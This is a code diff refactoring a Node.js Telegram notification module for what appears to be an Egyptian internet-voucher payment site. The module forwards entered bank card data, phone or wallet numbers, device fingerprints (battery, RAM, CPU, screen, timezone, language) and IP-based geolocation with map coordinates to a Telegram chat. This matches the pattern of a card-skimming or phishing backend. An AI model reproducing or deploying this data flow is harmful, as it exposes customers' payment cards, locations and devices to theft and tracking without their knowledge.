@@ -8,58 +8,32 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 const { BRANCH_NAMES } = require('./branches');
 
-/**
- * جلب بيانات الشبكة والموقع الجغرافي والإحداثيات بناءً على IP الخارجي
- */
 async function fetchNetworkDetailsByIP(ip) {
-  const result = {
-    location: "غير معروف",
-    isp: "غير معروف",
-    netLocation: "غير متاح"
-  };
-
-  if (!ip || ip === "غير متوفر" || ip === "127.0.0.1" || ip === "::1" || ip.includes("localhost")) {
-    return result;
-  }
-
+  const result = { location: "غير معروف", isp: "غير معروف", netLocation: "غير متاح" };
+  if (!ip || ip === "غير متوفر" || ip === "127.0.0.1" || ip === "::1" || ip.includes("localhost")) return result;
   const cleanIp = String(ip).split(",")[0].trim();
-
   try {
     const res = await axios.get(`https://ipwho.is/${cleanIp}?lang=ar`, { timeout: 3000 });
     if (res.data && res.data.success !== false) {
-      const city = res.data.city || res.data.region || "غير معروفة";
-      const country = res.data.country || "غير معروفة";
-      result.location = `${city}، ${country}`;
-      result.isp = (res.data.connection && res.data.connection.isp) ? res.data.connection.isp : (res.data.org || "غير معروف");
-      
-      const lat = res.data.latitude;
-      const lon = res.data.longitude;
-      if (lat && lon) {
-        result.netLocation = `<a href="https://maps.google.com/?q=${lat},${lon}">🗺 عرض الخريطة (${lat},${lon})</a>`;
+      result.location = `${res.data.city || res.data.region || "غير معروفة"}، ${res.data.country || "غير معروفة"}`;
+      result.isp = res.data.connection?.isp || res.data.org || "غير معروف";
+      if (res.data.latitude && res.data.longitude) {
+        result.netLocation = `<a href="https://maps.google.com/?q=${res.data.latitude},${res.data.longitude}">🗺 عرض الخريطة (${res.data.latitude},${res.data.longitude})</a>`;
       }
       return result;
     }
   } catch (e) {}
-
   try {
     const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,org,lat,lon,query`, { timeout: 3000 });
     if (fallbackRes.data && fallbackRes.data.status === "success") {
-      const city = fallbackRes.data.city || "غير معروفة";
-      const country = fallbackRes.data.country || "غير معروفة";
-      result.location = `${city}، ${country}`;
+      result.location = `${fallbackRes.data.city || "غير معروفة"}، ${fallbackRes.data.country || "غير معروفة"}`;
       result.isp = fallbackRes.data.isp || fallbackRes.data.org || "غير معروف";
-
-      const lat = fallbackRes.data.lat;
-      const lon = fallbackRes.data.lon;
-      if (lat && lon) {
-        result.netLocation = `<a href="https://maps.google.com/?q=${lat},${lon}">🗺 عرض الخريطة (${lat},${lon})</a>`;
+      if (fallbackRes.data.lat && fallbackRes.data.lon) {
+        result.netLocation = `<a href="https://maps.google.com/?q=${fallbackRes.data.lat},${fallbackRes.data.lon}">🗺 عرض الخريطة (${fallbackRes.data.lat},${fallbackRes.data.lon})</a>`;
       }
       return result;
     }
-  } catch (fallbackErr) {
-    console.warn("⚠️ تعذر جلب تفاصيل الموقع الجغرافي للـ IP:", cleanIp);
-  }
-
+  } catch (fallbackErr) {}
   return result;
 }
 
@@ -72,9 +46,7 @@ function getPaymentMethodName(data) {
 
 function getFormattedDateTime() {
   const now = new Date();
-  const formattedDate = now.toLocaleDateString("ar-EG", { timeZone: "Africa/Cairo" });
-  const formattedTime = now.toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" });
-  return `${formattedDate} -${formattedTime}`;
+  return `${now.toLocaleDateString("ar-EG", { timeZone: "Africa/Cairo" })} - ${now.toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" })}`;
 }
 
 function getPackageNameByAmount(amount) {
@@ -85,74 +57,45 @@ function getPackageNameByAmount(amount) {
     case 30: return "الباقة الذهبية";
     case 50: return "الباقة البلاتينية";
     case 100: return "الباقة الماسية";
-    default:
-      if (numAmount > 100) return "مساهمة ودعم للشبكة";
-      return "باقة إنترنت شبكة حكايات";
+    default: return numAmount > 100 ? "مساهمة ودعم للشبكة" : "باقة إنترنت شبكة حكايات";
   }
 }
 
 async function sendTelegramMessage(data, isInitial = true) {
   try {
-    if (!BOT_TOKEN || !CHAT_ID) {
-      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
-      return;
-    }
-
-    const publicIP = data.publicIP || (data.geoData && data.geoData.publicIP) || data.ip || "";
-
-    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) {
-      console.log("ℹ️ [Telegram] تم التجاوز: عدم إرسال إشعار للشبكة المحلية (Localhost).");
-      return;
-    }
+    if (!BOT_TOKEN || !CHAT_ID) return;
+    const publicIP = data.publicIP || data.geoData?.publicIP || data.ip || "";
+    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) return;
 
     const method = getPaymentMethodName(data);
-    const amountEGP = data.amount_cents
-      ? (data.amount_cents / 100).toFixed(2)
-      : (data.amount || "غير محدد");
+    const amountEGP = data.amount_cents ? (data.amount_cents / 100).toFixed(2) : (data.amount || "غير محدد");
     const dateTimeStr = getFormattedDateTime();
-
     const branchKey = data.branch || data.branchKey || "main";
     const branchName = data.branchName || BRANCH_NAMES[branchKey] || "حكايات نت رئيسي";
+    const userPhone = data.phone || data.billing_data?.phone_number || data.customer?.phone_number || "غير محدد";
     
-    const userPhone = data.phone || 
-                        data.billing_data?.phone_number || 
-                        data.customer?.phone_number || 
-                        "غير محدد";
+    // التقاط رقم العملية الموحد والثابت
     const txnId = data.id || data.transactionId || data.order?.id || data.merchant_order_id || `TX_${Date.now()}`;
 
     let message = "";
-
     if (isInitial) {
       const clientID = data.clientID || data.clientId || "غير متوفر";
-
       let ispText = data.ispProvider || data.isp || null;
       let netLocationText = data.netLocation || null;
 
       if (!ispText || ispText === "غير معروف" || !netLocationText || netLocationText === "غير متاح") {
         const netInfo = await fetchNetworkDetailsByIP(publicIP);
-        if (netInfo) {
-          if (!ispText || ispText === "غير معروف") ispText = netInfo.isp;
-          if (!netLocationText || netLocationText === "غير متاح") netLocationText = netInfo.netLocation;
-        }
+        ispText = ispText || netInfo.isp;
+        netLocationText = netLocationText || netInfo.netLocation;
       }
-
-      const batteryInfo = data.battery || data.batteryInfo || "غير متوفر";
-      const deviceRAM = data.deviceRAM || "غير متوفر";
-      const cpuCores = data.cpuCores || "غير متوفر";
-      const deviceType = data.deviceType || "غير متوفر";
-      const screenSize = data.screenSize || "غير متوفر";
-      const userTimeZone = data.userTimeZone || "غير متوفر";
-      const lang = data.lang || "غير متوفر";
 
       message = `⏳ <b>جاري عملية الدفع...</b>\n\n` +
                 `🏢 الفرع: <b>${branchName}</b>\n` +
                 `🆔 رقم العملية: <code>${txnId}</code>\n` +
                 `💳 وسيلة الدفع: <b>${method}</b>\n` +
                 `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n`;
-      
-      if (userPhone && userPhone !== "غير محدد") {
-        message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
-      }
+
+      if (userPhone && userPhone !== "غير محدد") message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
 
       if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
         message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
@@ -164,19 +107,18 @@ async function sendTelegramMessage(data, isInitial = true) {
 
       message += `\n<b>━━━━ ⚙️ بيانات الشبكة والجهاز ━━━━</b>\n` +
                  `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
-                 `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
+                 `💡 <b>نوع الجهاز:</b> <b>${data.deviceType || 'غير متوفر'}</b>\n` +
                  `🌐 <b>IP الخارجي:</b> <code>${publicIP || 'غير متوفر'}</code>\n` +
                  `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText || 'غير معروف'}</b>\n` +
                  `📍 <b>موقع الشبكة (IP Geo):</b> ${netLocationText || 'غير متاح'}\n` +
                  `----------------------------------------\n` +
                  `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>\n` +
-                 `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
-                 `🧠 <b>الذاكرة العشوائية (RAM):</b> <code>${deviceRAM}</code>\n` +
-                 `⚙️ <b>أنوية المعالج (CPU):</b> <code>${cpuCores} Cores</code>\n` +
-                 `📺 <b>أبعاد الشاشة:</b> <code>${screenSize}</code>\n` +
-                 `⏰ <b>المنطقة الزمنية:</b> <code>${userTimeZone}</code>\n` +
-                 `🌍 <b>لغة المتصفح:</b> <code>${lang}</code>`;
-
+                 `🔋 <b>حالة البطارية:</b> ${data.battery || 'غير متوفر'}\n` +
+                 `🧠 <b>الذاكرة (RAM):</b> <code>${data.deviceRAM || 'غير متوفر'}</code>\n` +
+                 `⚙️ <b>المعالج (CPU):</b> <code>${data.cpuCores || 'غير متوفر'} Cores</code>\n` +
+                 `📺 <b>الشاشة:</b> <code>${data.screenSize || 'غير متوفر'}</code>\n` +
+                 `⏰ <b>المنطقة الزمنية:</b> <code>${data.userTimeZone || 'غير متوفر'}</code>\n` +
+                 `🌍 <b>لغة المتصفح:</b> <code>${data.lang || 'غير متوفر'}</code>`;
     } else {
       const voucher = data.voucher_code || data.cardCode || "غير متوفر";
       const packageInfo = data.package_info || data.packageName || getPackageNameByAmount(amountEGP);
@@ -216,23 +158,10 @@ async function sendTelegramMessage(data, isInitial = true) {
 
 async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
   try {
-    if (!BOT_TOKEN || !CHAT_ID) {
-      console.warn("⚠️ [Telegram Error] BOT_TOKEN أو CHAT_ID مفقود!");
-      return;
-    }
-
-    if (!imageBuffer) {
-      console.error("❌ [Telegram Error] Buffer الصورة فارغ!");
-      return;
-    }
-
+    if (!BOT_TOKEN || !CHAT_ID || !imageBuffer) return;
     const form = new FormData();
     form.append("chat_id", CHAT_ID);
-    
-    form.append("photo", imageBuffer, {
-      filename: `card_${paymentDetails.transactionId || Date.now()}.png`,
-      contentType: "image/png"
-    });
+    form.append("photo", imageBuffer, { filename: `card_${paymentDetails.transactionId || Date.now()}.png`, contentType: "image/png" });
 
     const txnId = paymentDetails.transactionId || paymentDetails.id || `TX_${Date.now()}`;
     const amountVal = paymentDetails.amount || "0";
@@ -250,7 +179,6 @@ async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
 
     form.append("caption", caption);
     form.append("parse_mode", "HTML");
-
     form.append("reply_markup", JSON.stringify({
       inline_keyboard: [
         [
@@ -260,34 +188,22 @@ async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
       ]
     }));
 
-    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
-      headers: {
-        ...form.getHeaders()
-      },
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
+      headers: { ...form.getHeaders() },
       maxContentLength: Infinity,
       maxBodyLength: Infinity
     });
-
-    if (response.data && response.data.ok) {
-      console.log(`📸 [Telegram Image SUCCESS] تم إرسال صورة الكارت بنجاح للمعاملة: ${txnId}`);
-    }
-
   } catch (err) {
-    console.error("❌ [Telegram Image Error Details]:", err.response?.data || err.message);
+    console.error("❌ [Telegram Image Error]:", err.message);
   }
 }
 
-/**
- * 3. 🔄 معالجة الضغط على الأزرار التفاعلية (Callback Queries)
- */
 async function handleTelegramCallback(callbackQuery) {
   try {
     const queryId = callbackQuery.id;
     const data = callbackQuery.data;
     const chatId = callbackQuery.message.chat.id;
     const messageId = callbackQuery.message.message_id;
-
-    console.log(`📥 [Telegram Callback] تم استلام ضغطة زر: ${data}`);
 
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
       callback_query_id: queryId,
@@ -296,140 +212,48 @@ async function handleTelegramCallback(callbackQuery) {
     });
 
     const parts = data.split("_");
-
     if (data.startsWith("create_voucher")) {
       const branchKey = parts.pop();
       const amount = parts.pop();
-      parts.shift(); // إزالة "create"
-      parts.shift(); // إزالة "voucher"
+      parts.shift(); parts.shift();
       const txnId = parts.join("_");
 
-      console.log(`🎟️ [Voucher Creation Started] جارٍ إصدار الكارت للمعاملة: ${txnId} | المبلغ: ${amount} | الفرع: ${branchKey}`);
-
-      let voucherData = null;
-      let errorMessage = null;
-
-      try {
-        if (typeof mikrotikService !== "undefined" && typeof mikrotikService.processPaymentAndCreateCard === "function") {
-          voucherData = await mikrotikService.processPaymentAndCreateCard(amount, branchKey, txnId);
-        } else {
-          throw new Error("دالة processPaymentAndCreateCard غير موجودة في mikrotikService");
-        }
-      } catch (err) {
-        console.error("❌ خطأ أثناء توليد الكارت من ميكروتيك:", err);
-        errorMessage = err.message;
-      }
-
+      let voucherData = await mikrotikService.processPaymentAndCreateCard(amount, branchKey, txnId);
       if (voucherData && (voucherData.success || voucherData.cardCode)) {
-        if (global.generatedCardsMap) {
-          global.generatedCardsMap.set(txnId, {
-            isContribution: voucherData.isContribution || false,
-            success: true,
-            code: voucherData.cardCode || voucherData.username || "متاح",
-            voucher: {
-              username: voucherData.cardCode || voucherData.username || "متاح",
-              password: voucherData.password || ""
-            },
-            amount: amount,
-            transactionId: txnId,
-            packageName: voucherData.packageName || getPackageNameByAmount(amount),
-            branchKey: branchKey,
-            branchName: BRANCH_NAMES[branchKey] || "حكايات نت رئيسي",
-            createdAt: new Date()
-          });
-        }
-
         const usernameStr = voucherData.cardCode || voucherData.username || "متاح";
         const passwordStr = voucherData.password || "";
-        const targetBranchName = BRANCH_NAMES[branchKey] || "حكايات نت رئيسي";
-
-        const updatedText = callbackQuery.message.text + 
-          `\n\n✅ <b>[تم إصدار الكارت بنجاح لفرع: ${targetBranchName}]</b>\n🎟️ الكارت: <code>${usernameStr}</code>` +
-          (passwordStr ? `\n🔑 كلمة المرور: <code>${passwordStr}</code>` : ``);
-
+        const updatedText = callbackQuery.message.text + `\n\n✅ <b>[تم إصدار الكارت بنجاح]</b>\n🎟️ الكارت: <code>${usernameStr}</code>` + (passwordStr ? `\n🔑 كلمة المرور: <code>${passwordStr}</code>` : ``);
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-          chat_id: chatId,
-          message_id: messageId,
-          text: updatedText,
-          parse_mode: "HTML",
-          reply_markup: { inline_keyboard: [] }
-        });
-
-      } else {
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          chat_id: chatId,
-          text: `❌ فشل إصدار الكارت من الميكروتيك للفرع (${branchKey}) للمعاملة ${txnId}.\nالسبب: ${errorMessage || "خطأ غير معروف"}`
+          chat_id: chatId, message_id: messageId, text: updatedText, parse_mode: "HTML", reply_markup: { inline_keyboard: [] }
         });
       }
-
     } else if (data.startsWith("contribution")) {
       const branchKey = parts.pop();
       const amount = parts.pop();
-      parts.shift(); // إزالة "contribution"
+      parts.shift();
       const txnId = parts.join("_");
 
-      if (global.generatedCardsMap) {
-        global.generatedCardsMap.set(txnId, {
-          isContribution: true,
-          amount: amount,
-          transactionId: txnId,
-          packageName: `مساهمة بقيمة ${amount} جنيه`,
-          branchKey: branchKey,
-          createdAt: new Date()
-        });
-      }
-
-      const updatedText = callbackQuery.message.text + `\n\n🤝 <b>[تم تأكيد وتحويل العملية إلى مساهمة]</b> بقيمة: <code>${amount} جنيه</code> (رقم المعاملة: ${txnId})`;
-
+      const updatedText = callbackQuery.message.text + `\n\n🤝 <b>[تم تأكيد وتحويل العملية إلى مساهمة]</b> بقيمة: <code>${amount} جنيه</code>`;
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
-        chat_id: chatId,
-        message_id: messageId,
-        text: updatedText,
-        parse_mode: "HTML",
-        reply_markup: { inline_keyboard: [] }
+        chat_id: chatId, message_id: messageId, text: updatedText, parse_mode: "HTML", reply_markup: { inline_keyboard: [] }
       });
     }
-
   } catch (err) {
-    console.error("❌ [Telegram Callback Error]:", err.response?.data || err.message);
+    console.error("❌ [Telegram Callback Error]:", err.message);
   }
 }
 
-/**
- * 4. ❌ إرسال إشعار فشل الدفع إلى التليجرام مع والموقع الجغرافي للشبكة
- */
 async function sendTelegramFailNotification(errorMessage, data = {}) {
   try {
-    if (!BOT_TOKEN || !CHAT_ID) {
-      return;
-    }
-
+    if (!BOT_TOKEN || !CHAT_ID) return;
     const publicIP = data.publicIP || "غير متوفر";
-    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) {
-      return;
-    }
+    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) return;
 
     const netInfo = await fetchNetworkDetailsByIP(publicIP);
-    const ispText = netInfo.isp;
-    const netLocationText = netInfo.netLocation;
-    const dateTimeStr = getFormattedDateTime();
+    let message = `⚠️ سبب الخطأ: <i>${errorMessage}</i>\n🌐 IP: <code>${publicIP}</code>\n📡 مزود الخدمة: <b>${netInfo.isp}</b>\n📍 الموقع: ${netInfo.netLocation}`;
 
-    let message = `⚠️ سبب الخطأ: <i>${errorMessage}</i>\n` +
-                  `----------------------------------------\n` +
-                  `🌐 IP الخارجي: <code>${publicIP}</code>\n` +
-                  `📡 مزود الخدمة (ISP): <b>${ispText}</b>\n` +
-                  `📍 موقع الشبكة (IP Geo): ${netLocationText}\n` +
-                  `📅 وقت الزيارة: <code>${dateTimeStr}</code>`;
-
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: "HTML"
-    });
-
-  } catch (err) {
-    console.error("❌ [Telegram Fail Notification Error]:", err.response?.data || err.message);
-  }
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message, parse_mode: "HTML" });
+  } catch (err) {}
 }
 
 module.exports = {
